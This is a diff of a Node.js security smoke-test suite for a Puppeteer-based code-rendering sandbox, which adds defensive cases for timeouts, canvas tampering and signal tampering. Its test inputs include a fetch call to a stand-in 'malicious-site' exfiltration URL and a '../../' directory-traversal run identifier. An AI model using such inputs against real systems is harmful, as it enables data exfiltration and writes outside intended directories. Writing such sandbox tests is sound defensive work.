@@ -1,46 +1,108 @@
 const { renderCode, closeBrowser } = require('./sandbox');
+const fs = require('fs');
+const path = require('path');
 
 async function run() {
-    console.log("Running Security Smoke Test...");
+    console.log("Running Enhanced Security Smoke Tests...\n");
     
     const cases = [
         {
-            name: "Infinite Loop",
+            name: "Infinite Loop Defense",
             code: "function setup() { while(true){} }",
-            expect: "TIMEOUT"
+            expect: "TIMEOUT",
+            runId: "sec_test_loop"
         },
         {
-            name: "Invalid JavaScript",
+            name: "Invalid JavaScript Syntax",
             code: "function setup() { let x = ; }",
-            expect: "PARSE_ERROR"
+            expect: "PARSE_ERROR",
+            runId: "sec_test_syntax"
         },
         {
-            name: "Missing Canvas",
+            name: "Missing Canvas Extraction",
             code: "function setup() { let c = document.querySelector('canvas'); if(c) c.remove(); window.signalRenderComplete(); }",
-            expect: "NO_CANVAS"
+            expect: "NO_CANVAS",
+            runId: "sec_test_nocanvas"
         },
         {
-            name: "Runtime Exception",
-            code: "function setup() { createCanvas(100,100,WEBGL); throw new Error('crash'); window.signalRenderComplete(); }",
-            expect: "RUNTIME_ERROR" // Modified because it catches the error and exits with RUNTIME_ERROR now.
+            name: "Runtime Crash Handling",
+            code: "function setup() { createCanvas(100,100,WEBGL); throw new Error('intentional_crash'); }",
+            expect: "RUNTIME_ERROR",
+            runId: "sec_test_crash"
+        },
+        {
+            name: "Network Exfiltration Prevention (fetch)",
+            code: `function setup() {
+                createCanvas(100, 100, WEBGL);
+                fetch('https://malicious-site.example.com/exfiltrate').catch(() => {});
+            }`,
+            // Should succeed in rendering canvas locally while Puppeteer request interception aborts external URL
+            expect: "SUCCESS",
+            runId: "sec_test_net"
+        },
+        {
+            name: "Signal Tampering Resilience",
+            code: `function setup() {
+                try {
+                    window.signalRenderComplete = null;
+                } catch(e) {}
+                createCanvas(100, 100, WEBGL);
+                background(200);
+            }`,
+            expect: "SUCCESS",
+            runId: "sec_test_proto"
+        },
+        {
+            name: "Directory Traversal in runId Sanitization",
+            code: "function setup() { createCanvas(100, 100, WEBGL); background(150); }",
+            expect: "SUCCESS",
+            runId: "../../traversal_test_file"
+        },
+        {
+            name: "Canvas Removal & Tampering",
+            code: `function setup() {
+                createCanvas(100, 100, WEBGL);
+                const canvases = document.querySelectorAll('canvas');
+                canvases.forEach(c => c.style.display = 'none');
+            }`,
+            expect: "NO_CANVAS",
+            runId: "sec_test_tamper"
         }
     ];
     
-    let allPassed = true;
-    for(const c of cases) {
-        console.log(`Testing: ${c.name}`);
-        const result = await renderCode(c.code, 42, 'sec_test');
-        if(result.error_classification !== c.expect) {
-            console.error(`  FAIL: Expected ${c.expect}, got ${result.error_classification}`, result);
-            allPassed = false;
+    let passedCount = 0;
+    let failedCount = 0;
+
+    for (const c of cases) {
+        process.stdout.write(`  [TEST] ${c.name.padEnd(45, '.')}`);
+        const result = await renderCode(c.code, 42, c.runId);
+        
+        if (result.error_classification === c.expect) {
+            console.log(` [PASS] (Got: ${result.error_classification})`);
+            passedCount++;
         } else {
-            console.log(`  PASS: Got expected error ${c.expect}`);
+            console.log(` [FAIL] (Expected: ${c.expect}, Got: ${result.error_classification})`);
+            console.error("        Result details:", result);
+            failedCount++;
         }
     }
     
-    if(allPassed) {
-        console.log("SUCCESS: All security smoke tests passed.");
+    // Check that directory traversal didn't create a file outside renders dir
+    const outsideFile = path.resolve(__dirname, '../../traversal_test_file.png');
+    if (fs.existsSync(outsideFile)) {
+        console.error("  [FAIL] Directory traversal vulnerability detected: outside file was created!");
+        fs.unlinkSync(outsideFile);
+        failedCount++;
+    } else {
+        console.log("  [PASS] Directory traversal check: no files created outside renders folder.");
     }
+    
+    console.log(`\nSecurity Suite Summary: ${passedCount} Passed, ${failedCount} Failed`);
     await closeBrowser();
+    
+    if (failedCount > 0) {
+        process.exit(1);
+    }
 }
+
 run();
